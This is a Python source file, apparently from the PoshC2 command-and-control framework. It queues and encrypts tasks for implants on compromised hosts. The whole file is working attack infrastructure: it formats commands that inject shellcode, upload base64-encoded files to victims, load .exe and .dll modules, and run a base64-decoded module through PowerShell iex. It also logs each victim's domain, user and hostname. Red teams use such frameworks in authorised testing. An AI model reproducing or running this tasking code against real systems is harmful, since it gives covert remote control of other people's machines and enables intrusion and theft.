import datetime, hashlib, base64, traceback, os

from poshc2.Colours import Colours
from poshc2.server.Core import load_module, load_module_sharp, encrypt, default_response
from poshc2.server.Config import DatabaseType, ModulesDirectory

if DatabaseType.lower() == "postgres":
    import poshc2.server.database.DBPostgres as DB
else:
    import poshc2.server.database.DBSQLite as DB


def newTask(path):
    all_implants = DB.get_implants_all()
    commands = ""
    if all_implants:
        for i in all_implants:
            RandomURI = i.RandomURI
            EncKey = i.Key
            tasks = DB.get_newtasks(RandomURI)
            if RandomURI in path and tasks:
                for task in tasks:
                    command = task[2]
                    user = task[3]
                    user_command = command
                    implant = DB.get_implantbyrandomuri(RandomURI)
                    implant_type = DB.get_implanttype(RandomURI)
                    now = datetime.datetime.now()
                    if (command.lower().startswith("$shellcode64")) or (command.lower().startswith("$shellcode86") or command.lower().startswith("run-exe core.program core inject-shellcode")):
                        user_command = "Inject Shellcode: %s" % command[command.index("#") + 1:]
                        command = command[:command.index("#")]
                    elif (command.lower().startswith('upload-file')):
                        upload_args = command.replace('upload-file', '')
                        upload_file = upload_args.split()[0]
                        try:
                            upload_file_destination = upload_args.split()[1]
                        except:
                            print(Colours.RED)
                            print("Error parsing upload command: %s" % upload_args)
                            print(Colours.GREEN)
                        upload_args = upload_args.replace(upload_file, '')
                        upload_args = upload_args.replace(upload_file_destination, '')
                        with open(upload_file, "rb") as f:
                            upload_file_bytes = f.read()
                        if not upload_file_bytes:
                            print(Colours.RED + f"Error, no bytes read from the upload file, removing task: {upload_file}" + Colours.GREEN)
                            DB.del_newtasks(str(task[0]))
                            continue
                        upload_file_bytes_b64 = base64.b64encode(upload_file_bytes).decode("utf-8")
                        if implant_type.lower().startswith('c#'):
                            command = f"upload-file {upload_file_bytes_b64};\"{upload_file_destination}\" {upload_args}"
                        elif implant_type.lower().startswith('ps'):
                            command = f"Upload-File -Destination \"{upload_file_destination}\" -Base64 {upload_file_bytes_b64} {upload_args}"
                        elif implant_type.lower().startswith('py'):
                            command = f"upload-file \"{upload_file_destination}\":{upload_file_bytes_b64} {upload_args}"
                        else:
                            print(Colours.RED)
                            print("Error parsing upload command: %s" % upload_args)
                            print(Colours.GREEN)
                        filehash = hashlib.md5(base64.b64decode(upload_file_bytes_b64)).hexdigest()
                        user_command = f"Uploading file: {upload_file} to {upload_file_destination} with md5sum: {filehash}"
                    taskId = DB.insert_task(RandomURI, user_command, user)
                    taskIdStr = "0" * (5 - len(str(taskId))) + str(taskId)
                    if len(str(taskId)) > 5:
                        raise ValueError('Task ID is greater than 5 characters which is not supported.')
                    print(Colours.YELLOW)
                    if user is not None and user != "":
                        print("Task %s (%s) issued against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, user, implant.ImplantID, implant.Domain, implant.User, implant.Hostname, now.strftime("%d/%m/%Y %H:%M:%S")))
                    else:
                        print("Task %s issued against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, implant.ImplantID, implant.Domain, implant.User, implant.Hostname, now.strftime("%d/%m/%Y %H:%M:%S")))
                    try:
                        if (user_command.lower().startswith("run-exe sharpwmi.program sharpwmi action=execute")):
                            print(user_command[0:200])
                        else:
                            print(user_command)
                        print(Colours.END)
                    except Exception as e:
                        print("Cannot print output: %s" % e)
                    if task[2].startswith("loadmodule "):
                        try:
                            module_name = (task[2]).replace("loadmodule ", "")
                            if ".exe" in module_name:
                                modulestr = load_module_sharp(module_name)
                            elif ".dll" in module_name:
                                modulestr = load_module_sharp(module_name)
                            else:
                                modulestr = load_module(module_name)
                            command = "loadmodule%s" % modulestr
                        except Exception as e:
                            print("Cannot find module, loadmodule is case sensitive!")
                            print(e)
                    elif task[2].startswith("run-exe Program PS "):
                        try:
                            cmd = (task[2]).replace("run-exe Program PS ", "")
                            modulestr = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
                            command = "run-exe Program PS %s" % modulestr
                        except Exception as e:
                            print("Cannot base64 the command for PS")
                            print(e)
                            traceback.print_exc()
                    elif task[2].startswith("pslo "):
                        try:
                            module_name = (task[2]).replace("pslo ", "")
                            for modname in os.listdir(ModulesDirectory):
                                if modname.lower() in module_name.lower():
                                    module_name = modname
                            modulestr = load_module_sharp(module_name)
                            command = "run-exe Program PS loadmodule%s" % modulestr
                        except Exception as e:
                            print("Cannot find module, loadmodule is case sensitive!")
                            print(e)
                            traceback.print_exc()
                    elif task[2].startswith("pbind-loadmodule"):
                        try:
                            module_name = (task[2]).replace("pbind-loadmodule ", "")
                            if ".exe" in module_name:
                                modulestr = load_module_sharp(module_name)
                            elif ".dll" in module_name:
                                modulestr = load_module_sharp(module_name)
                            else:
                                modulestr = load_module(module_name)
                            command = "pbind-command \"`$mk = '%s';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$mk))|iex\"" % base64.b64encode(bytes(modulestr, "utf-8")).decode('utf-8')
                        except Exception as e:
                            print("Cannot find module, loadmodule is case sensitive!")
                            print(e)
                            traceback.print_exc()

                    # Uncomment to print actual commands that are being sent
                    # if "AAAAAAAAAAAAAAAAAAAA" not in command:
                    #     print(Colours.BLUE + "Issuing Command: " + command + Colours.GREEN)

                    command = taskIdStr + command
                    if commands:
                        commands += "!d-3dion@LD!-d" + command
                    else:
                        commands += command
                    DB.del_newtasks(str(task[0]))
                if commands is not None:
                    multicmd = "multicmd%s" % commands
                try:
                    responseVal = encrypt(EncKey, multicmd)
                except Exception as e:
                    responseVal = ""
                    print("Error encrypting value: %s" % e)
                now = datetime.datetime.now()
                DB.update_implant_lastseen(now.strftime("%d/%m/%Y %H:%M:%S"), RandomURI)
                return responseVal
            elif RandomURI in path and not tasks:
                # if there is no tasks but its a normal beacon send 200
                now = datetime.datetime.now()
                DB.update_implant_lastseen(now.strftime("%d/%m/%Y %H:%M:%S"), RandomURI)
                return default_response()
